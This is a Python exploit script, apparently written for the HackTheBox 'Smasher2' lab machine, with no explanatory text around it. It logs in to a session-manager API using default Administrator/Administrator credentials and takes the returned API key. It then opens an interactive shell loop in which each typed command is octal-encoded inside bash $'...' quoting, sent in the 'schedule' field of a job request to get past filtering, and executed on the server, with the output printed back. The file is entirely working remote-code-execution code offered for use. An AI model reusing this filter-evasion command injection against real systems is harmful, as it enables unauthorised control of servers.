#!/usr/bin/python3
# -*- coding: utf​-8​ -*-
import requests
import sys
import json

class smasher2rce(object):
    def __init__(self):
        self.page = 'http://wonderfulsessionmanager.smasher2.htb'
        self.headers = {'Content-Type':'application/json'}
        self.s = requests.Session()
        self.api_key = self.api()
        self.api_req = '/api/{}/job'.format(self.api_key)
        self.rce()

    def api(self):
        self.s.get(self.page, verify=False)
        headers = self.headers
        data = json.loads("""{"action":"auth","data":{"username":"Administrator","password":"Administrator"}}""")
        r = self.s.post(self.page + '/auth', headers=headers, json=data, verify=False)
        resp = json.loads(r.text)
        api_key = resp['result']['key']
        return api_key

    def rce(self):
        try:
            while True:
                cmd = input('>> ')
                payload = self.encodePayload(cmd)
                print('[*] Payload: {}'.format(payload))
                self.req(payload)
        except:
            sys.exit()

    def req(self, data):
        r = self.s.post(self.page + self.api_req, headers=self.headers, data=data, verify=False)

        if r.status_code == 500:
            print('[*] HTTP 500 Error')
        else:
            resp = json.loads(r.text)
            print(resp['result'].strip())

    def encodePayload(self, cmd):
        out = "$'"
        for ch in cmd:
          out += '\\' + oct(ord(ch))[2:]
        out  += "'"
        data = {"schedule":out}
        payload = json.dumps(data)
        return payload

if __name__ == '__main__':
    smasher2rce()
